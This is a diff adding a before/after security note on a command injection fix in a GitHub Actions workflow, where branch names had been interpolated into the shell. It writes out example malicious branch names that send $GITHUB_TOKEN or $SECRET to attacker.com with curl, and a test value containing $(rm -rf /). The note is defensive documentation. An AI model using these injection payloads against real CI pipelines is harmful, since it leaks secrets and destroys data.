@@ -1,0 +1,157 @@
+COMMAND INJECTION FIX - BEFORE/AFTER COMPARISON
+================================================
+
+═══════════════════════════════════════════════════════════════
+BEFORE (VULNERABLE) - Line 112
+═══════════════════════════════════════════════════════════════
+
+TARGET_BRANCH="${{ github.head_ref || github.ref_name }}"
+if [ -z "$TARGET_BRANCH" ]; then
+  echo "❌ Cannot determine target branch for push"
+  exit 1
+fi
+git push origin HEAD:"$TARGET_BRANCH"
+
+VULNERABILITY:
+  - GitHub Actions expression ${{ }} interpolated into shell
+  - Shell re-evaluates string, executes command substitution
+  - Attacker-controlled branch name can inject arbitrary commands
+
+ATTACK SCENARIO:
+  Branch: feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")
+
+  Expansion:
+    TARGET_BRANCH="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"
+
+  Execution:
+    Shell executes: curl https://attacker.com -d "$GITHUB_TOKEN"
+    Result: GITHUB_TOKEN leaked to attacker
+
+═══════════════════════════════════════════════════════════════
+AFTER (SECURE) - Line 112
+═══════════════════════════════════════════════════════════════
+
+TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+if [ -z "$TARGET_BRANCH" ]; then
+  echo "❌ Cannot determine target branch for push"
+  exit 1
+fi
+git push origin HEAD:"$TARGET_BRANCH"
+
+SECURITY:
+  - Reads pre-populated environment variables
+  - No shell re-evaluation or re-parsing
+  - Command substitution treated as literal string
+  - Safe for all branch names (including malicious)
+
+ATTACK SCENARIO (SAME BRANCH):
+  Branch: feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")
+
+  Environment:
+    GITHUB_HEAD_REF="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"
+
+  Expansion:
+    TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+    TARGET_BRANCH="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"
+
+  Execution:
+    None. $(...) is literal string, not executed.
+    Result: Branch name used as-is, no command injection
+
+═══════════════════════════════════════════════════════════════
+CHANGE SUMMARY
+═══════════════════════════════════════════════════════════════
+
+-TARGET_BRANCH="${{ github.head_ref || github.ref_name }}"
++TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+
+EXPLANATION:
+  - ${{ }} → Shell environment variable
+  - github.head_ref → GITHUB_HEAD_REF (pre-populated)
+  - github.ref_name → GITHUB_REF_NAME (pre-populated)
+  - || → :- (bash parameter expansion fallback)
+
+BASH PARAMETER EXPANSION:
+  ${VAR:-default}
+    - If VAR is set and non-empty, use its value
+    - Otherwise, use default value
+    - Reads from environment, no command substitution
+
+═══════════════════════════════════════════════════════════════
+SECURITY VERIFICATION
+═══════════════════════════════════════════════════════════════
+
+Test 1: Malicious Branch (Command Injection Attempt)
+  export GITHUB_HEAD_REF='feature/$(rm -rf /)'
+  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+  echo "$TARGET_BRANCH"
+  # Output: feature/$(rm -rf /)
+  # Result: ✅ No execution, literal string
+
+Test 2: Malicious Branch (Data Exfiltration Attempt)
+  export GITHUB_HEAD_REF='feature/$(curl attacker.com -d "$SECRET")'
+  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+  echo "$TARGET_BRANCH"
+  # Output: feature/$(curl attacker.com -d "$SECRET")
+  # Result: ✅ No execution, secret not leaked
+
+Test 3: Nested Command Substitution
+  export GITHUB_HEAD_REF='feature/$(whoami)/$(pwd)'
+  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+  echo "$TARGET_BRANCH"
+  # Output: feature/$(whoami)/$(pwd)
+  # Result: ✅ No execution, both substitutions literal
+
+Test 4: Fallback to GITHUB_REF_NAME
+  unset GITHUB_HEAD_REF
+  export GITHUB_REF_NAME='main'
+  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+  echo "$TARGET_BRANCH"
+  # Output: main
+  # Result: ✅ Fallback works correctly
+
+Test 5: Both Empty (Edge Case)
+  unset GITHUB_HEAD_REF
+  unset GITHUB_REF_NAME
+  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
+  if [ -z "$TARGET_BRANCH" ]; then
+    echo "Error: Cannot determine target branch"
+    exit 1
+  fi
+  # Output: Error: Cannot determine target branch
+  # Exit: 1
+  # Result: ✅ Graceful failure with guard
+
+═══════════════════════════════════════════════════════════════
+IMPACT ANALYSIS
+═══════════════════════════════════════════════════════════════
+
+BEFORE (Vulnerable):
+  Risk: 🔴 CRITICAL
+  - Remote Code Execution (RCE) possible
+  - Secret exfiltration possible
+  - Repository compromise possible
+  - Supply chain attack vector
+
+AFTER (Secure):
+  Risk: 🟢 NEGLIGIBLE
+  - No command execution possible
+  - Secrets safe
+  - Repository safe
+  - No attack vector
+
+FUNCTIONAL IMPACT:
+  ✅ No change in workflow behavior
+  ✅ All scenarios work identically
+  ✅ Backward compatible
+  ✅ Production-ready
+
+═══════════════════════════════════════════════════════════════
+FINAL STATUS
+═══════════════════════════════════════════════════════════════
+
+✅ Command injection vulnerability ELIMINATED
+✅ Secure for all branch names
+✅ Maintains workflow functionality
+✅ No regressions
+✅ Production-ready
